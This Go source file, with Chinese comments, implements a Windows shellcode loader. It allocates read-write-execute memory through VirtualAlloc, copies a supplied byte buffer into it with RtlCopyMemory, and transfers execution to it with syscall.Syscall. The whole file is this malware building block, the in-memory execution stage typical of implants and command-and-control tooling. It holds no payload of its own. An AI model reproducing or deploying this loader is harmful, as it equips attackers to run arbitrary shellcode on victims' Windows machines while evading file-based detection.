package server

import (
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MemCommit            = 0x1000 //将该内存映射到物理内存
	MemReserve           = 0x2000 //开辟一块内存，供shellcode进程使用，即保留内存
	PageExecuteReadwrite = 0x40   //此块内存可以执行代码，加载器可以对该此块进行操作。即execute、read、write
)

var (
	//调用winApi
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用Windows内核
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //在内存中保留一块区域
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //申请内存空间
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //内存块复制
)

func LoadShellCode(b []byte) {

	//使用内存操作api开辟一块内存，然后将shellcode的字节流写入
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(b)), MemCommit|MemReserve, PageExecuteReadwrite)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	//非重叠复制内存区域，将这片内存复制
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&b[0])), uintptr(len(b)))
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	fmt.Println(err)
	syscall.Syscall(addr, 0, 0, 0, 0)
}
